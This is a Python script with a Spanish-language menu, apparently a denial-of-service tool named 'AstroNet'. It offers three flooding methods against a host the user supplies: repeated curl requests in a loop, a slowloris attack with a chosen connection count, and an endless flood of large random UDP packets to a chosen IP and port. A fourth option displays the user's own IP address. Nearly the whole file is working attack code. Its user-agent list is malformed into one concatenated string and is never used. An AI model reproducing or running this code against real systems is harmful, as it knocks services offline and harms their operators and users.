from os import system
import time
from colorama import Fore
import socket
import random
Creator=Fore.BLUE+"74lg0"
Version=Fore.WHITE+"1.0"
user_agents={
    
    "Opera/9.61.(X11; Linux x86_64; az-IN) Presto/2.9.190 Version/12.00"
    
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/5.0)"
    
    "Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; ht-HT) AppleWebKit/532.19.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6532.19.2"
    
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/535.0 (KHTML, like Gecko) FxiOS/17.3h5139.0 Mobile/16K097 Safari/535.0"
    
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows 98; Trident/5.1)"
}



system("clear")
print(Fore.BLUE+"░█████╗░░██████╗████████╗██████╗░░█████╗ "+Fore.RED+" ███╗░░██╗███████╗████████╗")
print(Fore.BLUE+"██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗"+Fore.RED+" ████╗░██║██╔════╝╚══██╔══╝")
print(Fore.BLUE+"███████║╚█████╗░░░░██║░░░██████╔╝██║░░██║"+Fore.RED+" ██╔██╗██║█████╗░░░░░██║░░░")
print(Fore.BLUE+"██╔══██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║"+Fore.RED+" ██║╚████║██╔══╝░░░░░██║░░░")
print(Fore.BLUE+"██║░░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝"+Fore.RED+" ██║░╚███║███████╗░░░██║░░░")
print(Fore.BLUE+"╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝ "+Fore.RED+" ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░")
print("~~~~~~~~~~~~~~~~~~~~~~~~~Created by:"+Creator+Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
print("~~~~~~~~~~~~~~~~~~~~~~~~~ Version: "+Version+Fore.RED+" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
method=int(input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"Ver mi IP\n~~~~> "))
if method == 1:
    host=input("Ingresa el IP, Host\n~~~~> ")
    treads=input("Ingresa el numero de solicitudes, default("+Fore.BLUE+"500"+Fore.WHITE+")\n~~~~> ")
    code_response=input("Codigo de respuesta https"+Fore.RED+" 404"+Fore.WHITE+"\nDeseas cambiar el codigo de respuesta"+Fore.GREEN+" y"+Fore.WHITE+"/"+Fore.RED+"n"+Fore.WHITE+"\n~~~~> ")
    if code_response == "y":
        actual_response=input("Ingresa una ruta valida para la pagina "+Fore.BLUE+"\nExample: "+Fore.WHITE+"Index.html"+"\n~~~~>")
        print("Iniciando solicitudes...")
        time.sleep(1)
        if treads == "":
            for i in range(500):
                system("curl -s -o /dev/null "+host+"/"+actual_response)
            print("solicitudes terminadas...")
        else:
            for i in range(int(treads)):
                system("curl -s -o /dev/null "+host+"/"+actual_response)
            print("solicitudes terminadas...")
            
    
    if code_response == "n":
        time.sleep(1)
        if treads == "":
            for i in range(500):
                system("curl -s -o /dev/null "+host+"/hack-74lg0-for-educational-use")
            print("solicitudes terminadas...")
        else:
            print("Iniciando solicitudes...")
            time.sleep(1)
            for i in range(int(treads)):
                system("curl -s -o /dev/null "+host+"/hack-74lg0-for-educational-use")
            print("solicitudes terminadas...")
                
                
if method == 2:
    ip=input("Ingresa el IP, Host\n~~~~> ")
    port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~> ")
    HTTP_conexion=input("Ingresa la cantidad de conexiones\n~~~~> ")
    if HTTP_conexion == "":
        print("Elije la cantidad de conexiones y vuelve a intentarlo...")
        
    else:
        if port == "":
            print("Iniciando conexiones...")
            system("slowloris "+ip+" -s "+HTTP_conexion+" -p 80")
        
        else:
            print("Iniciando conexiones...")
            system("slowloris "+ip+" -s "+HTTP_conexion+" -p "+port)
            
            
if method == 3:
    sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes=random._urandom(51200)
    sock_socket=socket.socket(socket.AF_INET)
    ip=input("Ingresa la IP\n~~~~> ")
    port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~>")
    if port == "":
        print(Fore.WHITE+"Enviando paquetes a "+Fore.YELLOW+ip+Fore.WHITE+" a travez del puerto: "+Fore.BLUE+"80")
        while True:
            sock.sendto(bytes, (ip,80))
    else:
        print(Fore.WHITE+"Enviando paquetes a "+Fore.YELLOW+ip+Fore.WHITE+" a travez del puerto: "+Fore.BLUE+port)
        while True:
            sock.sendto(bytes, (ip,int(port)))
            
            
            
if method == 4:
    print("Tu direccion IP es:")
    time.sleep(2)
    system("curl ifconfig.me")
